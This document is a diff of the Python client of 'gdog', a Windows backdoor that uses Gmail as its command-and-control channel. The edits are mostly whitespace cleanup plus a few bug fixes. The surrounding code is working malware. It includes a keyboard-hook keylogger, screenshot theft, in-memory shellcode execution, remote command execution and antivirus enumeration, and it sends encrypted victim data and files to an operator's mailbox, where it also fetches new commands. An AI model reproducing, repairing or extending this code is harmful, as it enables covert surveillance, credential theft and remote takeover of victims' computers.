@@ -2,7 +2,7 @@
     This file is part of gdog
     Copyright (C) 2016 @maldevel
     https://github.com/maldevel/gdog
-    
+
     gdog - A fully featured backdoor that uses Gmail as a C&C server
 
     This program is free software: you can redistribute it and/or modify
@@ -17,7 +17,7 @@
 
     You should have received a copy of the GNU General Public License
     along with this program.  If not, see <http://www.gnu.org/licenses/>.
-    
+
     For more see the file 'LICENSE' for copying permission.
 """
 
@@ -83,29 +83,29 @@ VERSION = '1.0.0'
 
 
 class InfoSecurity:
-    
+
     def __init__(self):
         self.bs = 32
         self.key = hashlib.sha256(AESKey.encode()).digest()
-    
+
     def Encrypt(self, plainText):
         raw = self._pad(plainText)
         iv = Random.new().read(AES.block_size)
         cipher = AES.new(self.key, AES.MODE_CBC, iv)
         return base64.b64encode(iv + cipher.encrypt(raw))
-    
+
     def Decrypt(self, cipherText):
         enc = base64.b64decode(cipherText)
         iv = enc[:AES.block_size]
         cipher = AES.new(self.key, AES.MODE_CBC, iv)
         return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')
-    
+
     def _pad(self, s):
         return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)
 
     def _unpad(self, s):
         return s[:-ord(s[len(s)-1:])]
-    
+
 infoSec = InfoSecurity()
 
 
@@ -115,7 +115,7 @@ class AccountType(Enum):
     INTERDOMAIN_TRUST_ACCOUNT = 2048
     WORKSTATION_TRUST_ACCOUNT = 4096
     SERVER_TRUST_ACCOUNT = 8192
-    
+
 class ChassisTypes(Enum):
     Other = 1
     Unknown = 2
@@ -127,7 +127,7 @@ class ChassisTypes(Enum):
     Portable = 8
     Laptop = 9
     Notebook = 10
-    Handheld = 11 
+    Handheld = 11
     DockingStation = 12
     AllInOne = 13
     SubNotebook = 14
@@ -141,9 +141,9 @@ class ChassisTypes(Enum):
     StorageChassis = 22
     RackMountChassis = 23
     SealedCasePC = 24
-        
+
 def getGeolocation():
-    try:    
+    try:
         req = urllib2.Request('http://ip-api.com/json/', data=None, headers={
           'User-Agent':'Gdog'
         })
@@ -194,7 +194,7 @@ class SystemInfo:
         self.MAC = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
         self.IPv4 = ''
         for iface in netifaces.interfaces():
-            if netifaces.ifaddresses(iface)[netifaces.AF_LINK][0]['addr'] == self.MAC:
+            if netifaces.ifaddresses(iface)[netifaces.AF_LINK][0]['addr'] == self.MAC and netifaces.AF_INET in netifaces.ifaddresses(iface):
                 self.IPv4 = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])[0]['addr']
         self.Antivirus = []
         objWMI = GetObject('winmgmts:\\\\.\\root\\SecurityCenter2').InstancesOf('AntiVirusProduct')
@@ -209,19 +209,19 @@ class SystemInfo:
         for i in objWMI:
             self.Antispyware.append(i.displayName.strip())
         self.Geolocation = getGeolocation()
-    
+
 
         self.UniqueID = hashlib.sha256(
-                           self.Architecture + 
-                           self.WinVer + 
-                           self.CPU + 
-                           ';'.join(self.GPU) + 
-                           self.isAdmin + 
-                           self.Motherboard + 
-                           self.ChassisType + 
-                           '{0}@{1}'.format(self.User, self.PCName) + 
-                           str(self.TotalRam) + 
-                           self.Bios + 
+                           self.Architecture +
+                           self.WinVer +
+                           self.CPU +
+                           ';'.join(self.GPU) +
+                           self.isAdmin +
+                           self.Motherboard +
+                           self.ChassisType +
+                           '{0}@{1}'.format(self.User, self.PCName) +
+                           str(self.TotalRam) +
+                           self.Bios +
                            self.MAC
                    ).hexdigest()
 
@@ -229,11 +229,11 @@ class SystemInfo:
 sysInfo = SystemInfo()
 
 
-WH_KEYBOARD_LL=13                                                                 
+WH_KEYBOARD_LL=13
 WM_KEYDOWN=0x0100
 CTRL_CODE = 162
-        
-        
+
+
 ### Following code was stolen from python-mss https://github.com/BoboTiG/python-mss ###
 class BITMAPINFOHEADER(Structure):
     _fields_ = [('biSize', DWORD), ('biWidth', LONG), ('biHeight', LONG),
@@ -304,7 +304,7 @@ class screenshot(threading.Thread):
             yield ({
                 b'left': int(left),
                 b'top': int(top),
-                b'width': int(right - left),
+                b'width': int(right - left) - 1,
                 b'height': int(bottom - top)
             })
         else:
@@ -317,7 +317,7 @@ class screenshot(threading.Thread):
                 monitors.append({
                     b'left': int(rct.left),
                     b'top': int(rct.top),
-                    b'width': int(rct.right - rct.left),
+                    b'width': int(rct.right - rct.left) - 1,
                     b'height': int(rct.bottom - rct.top)
                 })
                 return 1
@@ -403,6 +403,7 @@ class screenshot(threading.Thread):
                 if '%d' in output:
                     fname = output.replace('%d', str(i + 1))
                 callback(fname)
+
                 self.save_img(data=self.get_pixels(monitor),
                               width=monitor[b'width'],
                               height=monitor[b'height'],
@@ -442,7 +443,7 @@ class screenshot(threading.Thread):
         iend[3] = pack(b'>I', zcrc32(iend[1]) & 0xffffffff)
         iend[0] = pack(b'>I', len(iend[2]))
 
-        with open(os.path.join(os.getenv('TEMP') + output), 'wb') as fileh:
+        with open(os.path.join(os.getenv('TEMP'), output), 'wb') as fileh:
             fileh.write(
                 magic + b''.join(ihdr) + b''.join(idat) + b''.join(iend))
             return
@@ -452,7 +453,7 @@ class screenshot(threading.Thread):
     def run(self):
         img_name = genRandomString() + '.png'
         for filename in self.save(output=img_name, screen=-1):
-            sendEmail({'cmd': 'screenshot', 'res': 'Screenshot taken'}, jobid=self.jobid, attachment=[os.path.join(os.getenv('TEMP') + img_name)])
+            sendEmail({'cmd': 'screenshot', 'res': 'Screenshot taken'}, jobid=self.jobid, attachment=[os.path.join(os.getenv('TEMP'), img_name)])
 
 ### End of python-mss code ###
 
@@ -482,7 +483,7 @@ class MessageParser:
 
 
 class keylogger(threading.Thread):
-    #Stolen from http://earnestwish.com/2015/06/09/python-keyboard-hooking/                                                          
+    #Stolen from http://earnestwish.com/2015/06/09/python-keyboard-hooking/
     exit = False
 
     def __init__(self, jobid):
@@ -493,11 +494,11 @@ class keylogger(threading.Thread):
         self.keys = ''
         self.start()
 
-    def installHookProc(self, pointer):                                           
-        self.hooked = ctypes.windll.user32.SetWindowsHookExA( 
-                        WH_KEYBOARD_LL, 
-                        pointer, 
-                        windll.kernel32.GetModuleHandleW(None), 
+    def installHookProc(self, pointer):
+        self.hooked = ctypes.windll.user32.SetWindowsHookExA(
+                        WH_KEYBOARD_LL,
+                        pointer,
+                        windll.kernel32.GetModuleHandleW(None),
                         0
         )
 
@@ -505,17 +506,17 @@ class keylogger(threading.Thread):
             return False
         return True
 
-    def uninstallHookProc(self):                                                  
+    def uninstallHookProc(self):
         if self.hooked is None:
             return
         ctypes.windll.user32.UnhookWindowsHookEx(self.hooked)
         self.hooked = None
 
-    def getFPTR(self, fn):                                                                  
+    def getFPTR(self, fn):
         CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
         return CMPFUNC(fn)
 
-    def hookProc(self, nCode, wParam, lParam):                                              
+    def hookProc(self, nCode, wParam, lParam):
         if wParam is not WM_KEYDOWN:
             return ctypes.windll.user32.CallNextHookEx(self.hooked, nCode, wParam, lParam)
 
@@ -529,13 +530,13 @@ class keylogger(threading.Thread):
             sendEmail({'cmd': 'keylogger', 'res': 'Keylogger stopped'}, self.jobid)
             self.uninstallHookProc()
 
-        return ctypes.windll.user32.CallNextHookEx(self.hooked, nCode, wParam, lParam)     
+        return ctypes.windll.user32.CallNextHookEx(self.hooked, nCode, wParam, lParam)
 
-    def startKeyLog(self):                                                                
+    def startKeyLog(self):
         msg = MSG()
         ctypes.windll.user32.GetMessageA(ctypes.byref(msg),0,0,0)
 
-    def run(self):                                 
+    def run(self):
         pointer = self.getFPTR(self.hookProc)
 
         if self.installHookProc(pointer):
@@ -578,7 +579,7 @@ class downloadfromurl(threading.Thread):
             sendEmail({'cmd': 'downloadfromurl', 'res': 'Success'}, self.jobid, [self.url])
         except Exception as e:
             sendEmail({'cmd': 'downloadfromurl', 'res': 'Failed: {}'.format(e)}, self.jobid)
-            
+
 
 class tasks(threading.Thread):
 
@@ -595,13 +596,13 @@ class tasks(threading.Thread):
         for process in w.Win32_Process ():
             procs.append('{0};{1}'.format(process.ProcessId, process.Name))
         return procs
-    
+
     def run(self):
         try:
             sendEmail({'cmd': 'tasks', 'res': self._detectRunningProcesses()}, self.jobid)
         except Exception as e:
             sendEmail({'cmd': 'tasks', 'res': 'Failed: {}'.format(e)}, self.jobid)
-            
+
 
 class services(threading.Thread):
 
@@ -618,13 +619,13 @@ class services(threading.Thread):
         for service in w.Win32_Service ():
             srvs.append('{0};{1}'.format(service.Name, str(service.StartMode)))
         return srvs
-    
+
     def run(self):
         try:
             sendEmail({'cmd': 'services', 'res': self._detectServices()}, self.jobid)
         except Exception as e:
             sendEmail({'cmd': 'services', 'res': 'Failed: {}'.format(e)}, self.jobid)
-            
+
 
 class users(threading.Thread):
 
@@ -641,13 +642,13 @@ class users(threading.Thread):
         for user in w.Win32_UserAccount ():
             usr.append('{0};{1};{2}'.format(user.Name, str(AccountType(user.AccountType)).split('.')[1], 'Disabled' if user.Disabled else 'Enabled'))
         return usr
-    
+
     def run(self):
         try:
             sendEmail({'cmd': 'users', 'res': self._detectUsers()}, self.jobid)
         except Exception as e:
             sendEmail({'cmd': 'users', 'res': 'Failed: {}'.format(e)}, self.jobid)
-            
+
 
 class devices(threading.Thread):
 
@@ -664,14 +665,14 @@ class devices(threading.Thread):
         for dev in w.Win32_PnPEntity ():
             devs.append('{0};{1}'.format(dev.Name, dev.Manufacturer))
         return devs
-    
+
     def run(self):
         try:
             sendEmail({'cmd': 'devices', 'res': self._detectDevices()}, self.jobid)
         except Exception as e:
             sendEmail({'cmd': 'devices', 'res': 'Failed: {}'.format(e)}, self.jobid)
-        
-               
+
+
 class upload(threading.Thread):
 
     def __init__(self, jobid, dest, attachment):
@@ -706,8 +707,8 @@ class lockScreen(threading.Thread):
         except Exception as e:
             #if verbose == True: print print_exc()
             pass
-        
-        
+
+
 class shutdown(threading.Thread):
 
     def __init__(self, jobid):
@@ -738,7 +739,7 @@ class restart(threading.Thread):
         try:
             sendEmail({'cmd': 'restart', 'res': 'Success'}, jobid=self.jobid)
             time.sleep(3)
-            subprocess.call(["shutdown", "/f", "/r", "/t", "0"])            
+            subprocess.call(["shutdown", "/f", "/r", "/t", "0"])
         except Exception as e:
             #if verbose == True: print print_exc()
             pass
@@ -781,8 +782,8 @@ class email_check(threading.Thread ):
         except Exception as e:
             #if verbose == True: print print_exc()
             pass
-        
-        
+
+
 class logoff(threading.Thread):
 
     def __init__(self, jobid):
@@ -795,11 +796,11 @@ class logoff(threading.Thread):
         try:
             sendEmail({'cmd': 'logoff', 'res': 'Success'}, jobid=self.jobid)
             time.sleep(3)
-            subprocess.call(["shutdown", "/f", "/l"])            
+            subprocess.call(["shutdown", "/f", "/l"])
         except Exception as e:
             #if verbose == True: print print_exc()
             pass
-        
+
 class execShellcode(threading.Thread):
 
     def __init__(self, shellc, jobid):
@@ -815,22 +816,22 @@ class execShellcode(threading.Thread):
             shellcode = self.shellc.decode("string_escape")
             shellcode = bytearray(shellcode)
 
-            ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), 
-                                                      ctypes.c_int(len(shellcode)), 
-                                                      ctypes.c_int(0x3000), 
+            ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                                      ctypes.c_int(len(shellcode)),
+                                                      ctypes.c_int(0x3000),
                                                       ctypes.c_int(0x40))
-        
+
             buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
-        
-            ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode))) 
-            
+
+            ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))
+
             ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                                      ctypes.c_int(0),
                                                      ctypes.c_int(ptr),
                                                      ctypes.c_int(0),
                                                      ctypes.c_int(0),
                                                      ctypes.pointer(ctypes.c_int(0)))
-            
+
             ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 
         except Exception as e:
@@ -854,8 +855,8 @@ class visitwebsite(threading.Thread):
         except Exception as e:
             #if verbose == True: print_exc()
             pass
-        
-        
+
+
 class execCmd(threading.Thread):
 
     def __init__(self, command, jobid):
@@ -900,7 +901,7 @@ class message(threading.Thread):
 def genRandomString(slen=10):
     return ''.join(random.sample(string.ascii_letters + string.digits, slen))
 
-  
+
 def detectForgroundWindows():
     #Stolen fom https://sjohannes.wordpress.com/2012/03/23/win32-python-getting-all-window-titles/
     EnumWindows = ctypes.windll.user32.EnumWindows
@@ -919,7 +920,7 @@ def detectForgroundWindows():
         return True
 
     EnumWindows(EnumWindowsProc(foreach_window), 0)
-     
+
     return titles
 
 
@@ -947,10 +948,10 @@ class sendEmail(threading.Thread):
         msg['Subject'] = sub_header
 
         message_content = infoSec.Encrypt(json.dumps({
-                  'fgwindow': detectForgroundWindows(), 
+                  'fgwindow': detectForgroundWindows(),
                   'user': '{0}@{1}'.format(sysInfo.User, sysInfo.PCName),
-                  'arch': sysInfo.Architecture, 
-                  'os': sysInfo.WinVer, 
+                  'arch': sysInfo.Architecture,
+                  'os': sysInfo.WinVer,
                   'cpu': sysInfo.CPU,
                   'gpu': sysInfo.GPU,
                   'motherboard': sysInfo.Motherboard,
@@ -969,7 +970,7 @@ class sendEmail(threading.Thread):
                   'version': VERSION,
                   'msg': self.text
           }))
-        
+
         msg.attach(MIMEText(str(message_content)))
 
         for attach in self.attachment:
@@ -1008,13 +1009,13 @@ def checkJobs():
             typ, id_list = c.uid('search', None, "(UNSEEN SUBJECT 'gdog:{}')".format(sysInfo.UniqueID))
 
             for msg_id in id_list[0].split():
-                
+
                 #logging.debug("[checkJobs] parsing message with uid: {}".format(msg_id))
-                
+
                 msg_data = c.uid('fetch', msg_id, '(RFC822)')
                 msg = MessageParser(msg_data)
                 jobid = msg.subject.split(':')[2]
-            
+
                 if msg.dict:
                     cmd = msg.dict['cmd'].lower()
                     arg = msg.dict['arg']
@@ -1026,7 +1027,7 @@ def checkJobs():
 
                     elif cmd == 'download':
                         download(jobid, arg)
-                        
+
                     elif cmd == 'downloadfromurl':
                         downloadfromurl(jobid, arg)
 
@@ -1035,25 +1036,25 @@ def checkJobs():
 
                     elif cmd == 'screenshot':
                         screenshot(jobid)
-                        
+
                     elif cmd == 'tasks':
                         tasks(jobid)
-                        
+
                     elif cmd == 'services':
                         services(jobid)
-                        
+
                     elif cmd == 'users':
                         users(jobid)
-                        
+
                     elif cmd == 'devices':
                         devices(jobid)
 
                     elif cmd == 'cmd':
                         execCmd(arg, jobid)
-                        
+
                     elif cmd == 'visitwebsite':
                         visitwebsite(arg, jobid)
-                        
+
                     elif cmd == 'message':
                         message(arg, jobid)
 
@@ -1062,13 +1063,13 @@ def checkJobs():
 
                     elif cmd == 'shutdown':
                         shutdown(jobid)
-                        
+
                     elif cmd == 'restart':
                         restart(jobid)
-                        
+
                     elif cmd == 'logoff':
                         logoff(jobid)
-                        
+
                     elif cmd == 'startkeylogger':
                         keylogger.exit = False
                         keylogger(jobid)
@@ -1105,7 +1106,7 @@ def checkJobs():
             else:
                 time.sleep(EMAIL_KNOCK_TIMEOUT)
 
-        
+
         except Exception as e:
             #logging.debug(format_exc())
             time.sleep(EMAIL_KNOCK_TIMEOUT)
@@ -1117,5 +1118,5 @@ if __name__ == '__main__':
         checkJobs()
     except KeyboardInterrupt:
         pass
-    
-    
+
+
